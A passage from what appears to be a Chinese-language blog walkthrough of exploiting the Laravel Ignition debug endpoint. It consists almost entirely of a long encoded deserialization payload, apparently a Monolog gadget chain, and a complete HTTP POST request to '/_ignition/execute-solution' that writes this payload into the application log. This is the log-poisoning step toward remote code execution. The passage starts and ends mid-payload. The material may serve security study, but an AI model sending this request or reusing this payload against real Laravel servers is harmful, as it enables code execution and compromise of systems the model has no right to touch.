0&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;46&#x3D;00&#x3D;73&#x3D;00&#x3D;61&#x3D;00&#x3D;58&#x3D;00&#x3D;70&#x3D;00&#x3D;6C&#x3D;00&#x3D;5A&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;78&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;30&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;79&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;4E&#x3D;00&#x3D;76&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4D&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;59&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;66&#x3D;00&#x3D;64&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;39&#x3D;00&#x3D;6D&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;4E&#x3D;00&#x3D;70&#x3D;00&#x3D;65&#x3D;00&#x3D;6D&#x3D;00&#x3D;55&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4C&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;63&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;62&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;31&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;32&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;77&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4E&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;4D&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;77&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;62&#x3D;00&#x3D;33&#x3D;00&#x3D;4A&#x3D;00&#x3D;7A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;68&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;31&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;6E&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;6A&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;78&#x3D;00&#x3D;73&#x3D;00&#x3D;58&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;66&#x3D;00&#x3D;5A&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;59&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;42&#x3D;00&#x3D;51&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;52&#x3D;00&#x3D;31&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;35&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;47&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4C&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;51&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;68&#x3D;00&#x3D;30&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;47&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4C&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;52&#x3D;00&#x3D;35&#x3D;00&#x3D;64&#x3D;00&#x3D;71&#x3D;00&#x3D;45&#x3D;00&#x3D;47&#x3D;00&#x3D;48&#x3D;00&#x3D;58&#x3D;00&#x3D;52&#x3D;00&#x3D;53&#x3D;00&#x3D;6B&#x3D;00&#x3D;44&#x3D;00&#x3D;33&#x3D;00&#x3D;50&#x3D;00&#x3D;52&#x3D;00&#x3D;6D&#x3D;00&#x3D;33&#x3D;00&#x3D;58&#x3D;00&#x3D;36&#x3D;00&#x3D;2F&#x3D;00&#x3D;68&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;31&#x3D;00&#x3D;4D&#x3D;00&#x3D;58&#x3D;00&#x3D;51&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;48&#x3D;00&#x3D;51&#x3D;00&#x3D;6B&#x3D;00&#x3D;31&#x3D;00&#x3D;43&#x3D;00&#39;</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure><h3 id="写入log"><a href="#写入log" class="headerlink" title="写入log"></a>写入log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 6537</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;&#x3D;50&#x3D;00&#x3D;44&#x3D;00&#x3D;39&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;49&#x3D;00&#x3D;51&#x3D;00&#x3D;55&#x3D;00&#x3D;78&#x3D;00&#x3D;55&#x3D;00&#x3D;58&#x3D;00&#x3D;30&#x3D;00&#x3D;4E&#x3D;00&#x3D;50&#x3D;00&#x3D;54&#x3D;00&#x3D;56&#x3D;00&#x3D;42&#x3D;00&#x3D;4A&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;56&#x3D;00&#x3D;53&#x3D;00&#x3D;4B&#x3D;00&#x3D;43&#x3D;00&#x3D;6B&#x3D;00&#x3D;37&#x3D;00&#x3D;49&#x3D;00&#x3D;44&#x3D;00&#x3D;38&#x3D;00&#x3D;2B&#x3D;00&#x3D;44&#x3D;00&#x3D;51&#x3D;00&#x3D;72&#x3D;00&#x3D;5A&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;7A&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;46&#x3D;00&#x3D;4E&#x3D;00&#x3D;35&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;56&#x3D;00&#x3D;6B&#x3D;00&#x3D;63&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;61&#x3D;00&#x3D;32&#x3D;00&#x3D;56&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;50&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;4E&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;35&#x3D;00&#x3D;76&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;39&#x3D;00&#x3D;6E&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;63&#x3D;00&#x3D;51&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;53&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;41&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;59&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;55&#x3D;00&#x3D;32&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;53&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;0